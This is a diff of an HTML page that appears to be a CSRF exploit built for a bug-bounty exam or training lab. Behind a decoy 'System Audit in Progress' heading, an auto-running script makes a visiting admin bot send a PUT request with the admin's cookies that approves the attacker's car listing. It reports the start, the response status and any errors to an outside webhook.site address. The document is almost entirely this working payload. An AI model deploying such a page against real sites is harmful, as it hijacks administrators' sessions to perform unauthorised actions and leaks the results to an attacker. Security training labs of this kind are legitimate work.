@@ -1,16 +1,27 @@
 <html>
-  <body>
-    <h1>Processing Review...</h1>
+<body>
+    <h1>System Audit in Progress...</h1>
     <script>
-      // This script runs in the Admin Bot's browser
-      fetch('https://api-bugbounty-exam.hashacademy.co/api/admin/cars/69dd69884e3edba5f08f60f9/approve', {
-        method: 'PUT',
-        credentials: 'include' // This ensures the Admin's cookies are sent
-      })
-      .then(response => {
-        // Optional: Send a confirmation to yourself that the bot triggered it
-        fetch('https://webhook.site/bd2deb0f-4b44-46ed-9533-ddaa9746dc19');
-      });
+        const carId = '69dd69884e3edba5f08f60f9';
+        const apiUrl = `https://api-bugbounty-exam.hashacademy.co/api/admin/cars/${carId}/approve`;
+        const webhook = 'https://webhook.site/bd2deb0f-4b44-46ed-9533-ddaa9746dc19';
+
+        // 1. Send a 'Starting' ping to your webhook
+        fetch(`${webhook}?step=starting`);
+
+        // 2. The Actual Exploit: Force the Admin Bot to approve your car
+        fetch(apiUrl, {
+            method: 'PUT',
+            credentials: 'include', // CRITICAL: Sends the Admin's cookies
+            mode: 'cors'
+        })
+        .then(response => {
+            // 3. Send the result to your webhook
+            fetch(`${webhook}?step=result&status=${response.status}`);
+        })
+        .catch(err => {
+            fetch(`${webhook}?step=error&msg=${encodeURIComponent(err.message)}`);
+        });
     </script>
-  </body>
+</body>
 </html>
